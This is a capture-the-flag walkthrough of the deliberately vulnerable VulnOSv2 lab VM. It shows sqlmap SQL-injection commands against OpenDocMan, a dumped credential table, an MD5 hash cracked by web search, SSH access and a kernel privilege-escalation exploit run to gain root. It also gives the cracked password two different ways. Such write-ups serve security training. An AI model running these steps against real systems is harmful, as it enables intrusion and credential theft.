###### Description: Writeup of VulnOSv2 VM in Vulnhub by the author c4b3rw0lf

Let's begin by scanning the host: 

```
# nmap -A -T4 -sV -PN -p- 192.168.0.15

Nmap scan report for 192.168.0.15
Host is up (0.00022s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| ssh-hostkey: 1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
| 2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|_256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=6.40%I=7%D=5/20%Time=573F2008%P=x86_64-pc-linux-gnu%r(NULL
SF:,2B,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\.6\r\n");
MAC Address: 08:00:27:57:4F:AA (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.40%E=4%D=5/20%OT=22%CT=1%CU=39556%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=573F2056%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%TS=8
OS:)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4
OS:ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1
OS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O
OS:=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: irc.example.net

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.0.15

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1041.99 seconds
```

So we discovered it has the following services running:
- SSH (22/TCP)
- HTTP (80/TCP)
- IRCd (6667/TCP)

Firing up the browser we encounter a black screen pointing us to http://192.168.0.15/jabc/. 

Following this link we reach another page called "JBC Just Another Bioware Company". Not many interesting stuff here so I decided to have a look at the website source code. 

Poking around some pages I've found /jabc/modules/system/ with apache index enabled, with many many files:

```
Index of /jabc/modules/system
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	html.tpl.php	2016-04-16 15:17 	2.7K	 
[ ]	image.gd.inc	2016-04-16 15:17 	12K	 
[ ]	language.api.php	2016-04-16 15:17 	6.4K	 
[ ]	maintenance-page.tpl.php	2016-04-16 15:17 	2.9K	 
[ ]	page.tpl.php	2016-04-16 15:17 	6.8K	 
[ ]	region.tpl.php	2016-04-16 15:17 	1.3K	 
[TXT]	system.admin-rtl.css	2016-04-16 15:17 	1.4K	 
[TXT]	system.admin.css	2016-04-16 15:17 	5.0K	 
[ ]	system.admin.inc	2016-04-16 15:17 	113K	 
[ ]	system.api.php	2016-04-16 15:17 	193K	 
[ ]	system.archiver.inc	2016-04-16 15:17 	3.0K	 
[TXT]	system.base-rtl.css	2016-04-16 15:17 	869 	 
[TXT]	system.base.css	2016-04-16 15:17 	5.2K	 
[ ]	system.cron.js	2016-04-16 15:17 	489 	 
[ ]	system.info	2016-04-16 15:17 	462 	 
[ ]	system.install	2016-04-16 15:17 	112K	 
[ ]	system.js	2016-04-16 15:17 	4.6K	 
[ ]	system.mail.inc	2016-04-16 15:17 	4.5K	 
[TXT]	system.maintenance.css	2016-04-16 15:17 	811 	 
[TXT]	system.menus-rtl.css	2016-04-16 15:17 	551 	 
[TXT]	system.menus.css	2016-04-16 15:17 	2.0K	 
[TXT]	system.messages-rtl.css	2016-04-16 15:17 	176 	 
[TXT]	system.messages.css	2016-04-16 15:17 	961 	 
[ ]	system.module	2016-04-16 15:17 	137K	 
[ ]	system.queue.inc	2016-04-16 15:17 	12K	 
[ ]	system.tar.inc	2016-04-16 15:17 	62K	 
[ ]	system.test	2016-04-16 15:17 	108K	 
[TXT]	system.theme-rtl.css	2016-04-16 15:17 	811 	 
[TXT]	system.theme.css	2016-04-16 15:17 	3.6K	 
[ ]	system.tokens.inc	2016-04-16 15:17 	7.9K	 
[ ]	system.updater.inc	2016-04-16 15:17 	4.6K	 
[ ]	theme.api.php	2016-04-16 15:17 	8.8K

```
All TXT files are basically CSS files, not too important information there, so I continued browsing through JABS products and found the page: /jabc/?q=node/7.

Inspecting the source I found the following lines: 
```
<p><span style="color:#000000">For security reasons, this section is hidden.</span></p>
<p><span style="color:#000000">For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest</span></p>
<p><span style="color:#000000">Thank you.</span></p>
```

Now we've got a new link called /jbacd0cs/ and also some guest/guest credentials. Accessing the URL in question it gets us to a page called "opendocman".

Using the guest/guest credentials it was possible to log into the application.

We are presented with something like a database administration but with guest privileges.

First I've tried to upload a simple test.php file with a print inside, but I've got the error message: 

```
MIMETYPE: text/x-php Failed
```

So we can assume that the system is blocking PHP files. So I started looking for exploits for "OpenDocMan v1.2.7" version in use. I've found in www.exploit-db.com the following exploit: 

https://www.exploit-db.com/exploits/32075/

Analyzing the exploit we can see that it is an SQL Injection and is related to a insufficient validation of "add_value" HTTP GET parameter in "/ajax_udf.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.
 
Let's fire up sqlmap using the value in question and see what databases we can find:

```
# sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --dbs

... snip ...

[22:56:29] [INFO] resuming back-end DBMS 'mysql' 
[22:56:29] [INFO] testing connection to the target URL
[22:56:29] [INFO] heuristics detected web page charset 'ISO-8859-2'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: add_value (GET)
    Type: UNION query
    Title: MySQL UNION query (86) - 9 columns
    Payload: q=1&add_value=odm_user UNION ALL SELECT 86,CONCAT(0x71716a6a71,0x6677646748424473794d5952474d4977574c6a4447526b65667267776852736c6f556f7967795a52,0x71706b7171),86,86,86,86,86,86,86#
---
[22:56:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5
[22:56:29] [INFO] fetching database names
[22:56:29] [INFO] heuristics detected web page charset 'windows-1252'
[22:56:29] [WARNING] reflective value(s) found and filtering out
available databases [6]:
[*] drupal7
[*] information_schema
[*] jabcd0cs
[*] mysql
[*] performance_schema
[*] phpmyadmin

```

After some sqlmap we can see that we are fetching information from a MySQL Database server, and we've found interesting tables here, including phpmyadmin, which may be used to administer the database. 

Let's try to see the tables for the "jabcd0cs" database first:

```
# sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --dbs --tables
```
The output is huge so I won't be posting here, BUT, analyzing all the databases we've got, I found one called "odm_user" which appears to be the table responsible for the user's credentials.

Let's try to dump the contents (rows) of this table: 

```
./sqlmap.py -u 'http://192.168.0.15/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --dbs -T odm_user --dump

... snip

Database: jabcd0cs
Table: odm_user
[2 entries]
+----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
| id | phone       | Email              | username | password                                 | last_name | first_name | department | pw_reset_code |
+----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | <blank>       |
| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
+----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+

...snip
```

Notice that one of the users is "webmin". Once we have the hash we can try to discover what kind of hash it is, by using hash-identifier: 

```
# hash-identifier

... snip ...

 HASH: b78aae356709f8c31118ea613980954b

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

So let's do the cracking in an easy way, throwing the hash into google. It was very easy to retrieve the password for this hash, which is "webmin1980".

Let's try to log in the same application again with the credentials webmin/webmin1908. DONE !!! Worked like a charm !!

Now i've noticed that we have a new menu option called "Admin". Cool !!

Checking the "webmin" settings I can see that it's actually a real user, so we can try to SSH into the server with the same credentials.

```
ssh webmin@192.168.0.15
The authenticity of host '192.168.0.15 (192.168.0.15)' can't be established.
ECDSA key fingerprint is ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.15' (ECDSA) to the list of known hosts.
webmin@192.168.0.15's password: 
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri May 20 23:23:35 CEST 2016

  System load: 0.0               Memory usage: 3%   Processes:       63
  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May  4 10:41:07 2016
$ whoami
webmin
$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
```

YES !!! Now let's see what kind of privileges we have:

```
$ whoami
webmin
$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
```

OK, we are just a normal user in the system, but checking out our uname output, we can se we're using an Ubuntu Server with a kernel that's vulnerable to a Local Privilege Escalation exploit:

```
$ uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
```

The exploit can be found here https://www.exploit-db.com/exploits/37292/

Let's check very quickly if we have at least GCC to compile the exploit, once it's a C exploit:

```
$ which gcc
/usr/bin/gcc
```

Yeah, we have GCC, so everything should be ready to go.

Once we don't have write privileges in the directory we are now, we change to /tmp directory and create a file called "exploit.c" to place our exploit.

```
$ cd /tmp
$ touch exploit.c
```

Now we paste the content of the exploit into the exploit.c file and run it. Notice that we were webmin user before, now we are root:

```
$ whoami
webmin
$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```

Pwned !!!! Now we are root. The only thing left is to find the flag. Let's list the files in our home directory ~root:

```
# cd ~root
# ls -lha
total 36K
drwx------  3 root root 4.0K May  4 19:37 .
drwxr-xr-x 21 root root 4.0K Apr  3 18:06 ..
-rw-------  1 root root    9 May  4 19:37 .bash_history
-rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
drwx------  2 root root 4.0K May  2 18:55 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root    3 May  2 19:01 .psql_history
-rw-------  1 root root  735 May  4 19:06 .viminfo
-rw-r--r--  1 root root  165 May  4 19:06 flag.txt
```

It seems that the flag is there, let's have a look at the "flag.txt" file:

```
# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

Voilá !!! There it is, the FLAG !!!!
